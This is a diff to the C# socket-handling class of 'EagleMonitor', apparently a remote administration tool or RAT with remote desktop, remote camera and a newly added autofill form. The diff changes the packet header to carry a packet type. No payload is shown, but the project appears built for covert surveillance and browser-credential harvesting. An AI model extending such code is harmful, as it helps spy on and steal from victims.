@@ -63,6 +63,7 @@ namespace EagleMonitor.Networking
         internal RemoteDesktopForm remoteDesktopForm { get; set; }
         internal RemoteCamera remoteCamera { get; set; }
         internal InformationForm informationForm { get; set; }
+        internal AutofillForm autofillForm { get; set; }
 
         internal ClientHandler(Socket sock, int port) 
         {
@@ -90,16 +91,20 @@ namespace EagleMonitor.Networking
                 this.Dispose();
             }
         }
+
         private byte[] ReceiveData()
         {
             try
             {
                 int total = 0;
                 int recv;
-                byte[] datasize = new byte[4];
+                byte[] header = new byte[5];
                 socket.Poll(-1, SelectMode.SelectRead);
-                recv = socket.Receive(datasize, 0, 4, 0);
-                int size = BitConverter.ToInt32(datasize, 0);
+                recv = socket.Receive(header, 0, 5, 0);
+
+                int size = BitConverter.ToInt32(new byte[4] { header[0], header[1], header[2], header[3] }, 0);
+                PacketType packetType = (PacketType)header[4];
+               
                 int dataleft = size;
                 byte[] data = new byte[size];
                 while (total < size)
@@ -123,6 +128,7 @@ namespace EagleMonitor.Networking
             {
                 byte[] data = readDataAsync.EndInvoke(ar);
 
+
                 if (data != null)//&& Connected)
                     readPacketAsync.BeginInvoke(data, new AsyncCallback(EndPacketRead), null);
 
@@ -140,7 +146,8 @@ namespace EagleMonitor.Networking
         {
             try
             {
-                return BufferPacket.DeserializePacket(Utils.Miscellaneous.settings.key);
+                int packetSize = 0;
+                return BufferPacket.DeserializePacket(Utils.Miscellaneous.settings.key);//, out packetSize);
             }
             catch (Exception)
             {
@@ -214,10 +221,19 @@ namespace EagleMonitor.Networking
                     int total = 0;
                     int size = encryptedData.Length;
                     int datalft = size;
-                    byte[] datasize = new byte[4];
+                    byte[] header = new byte[5];
                     socket.Poll(-1, SelectMode.SelectWrite);
-                    datasize = BitConverter.GetBytes(size);
-                    int sent = socket.Send(datasize);
+
+                    byte[] temp = BitConverter.GetBytes(size);
+
+                    header[0] = temp[0];
+                    header[1] = temp[1];
+                    header[2] = temp[2];
+                    header[3] = temp[3];
+                    header[4] = (byte)data.packetType;
+
+                    int sent = socket.Send(header);
+
                     while (total < size)
                     {
                         sent = socket.Send(encryptedData, total, size, SocketFlags.None);
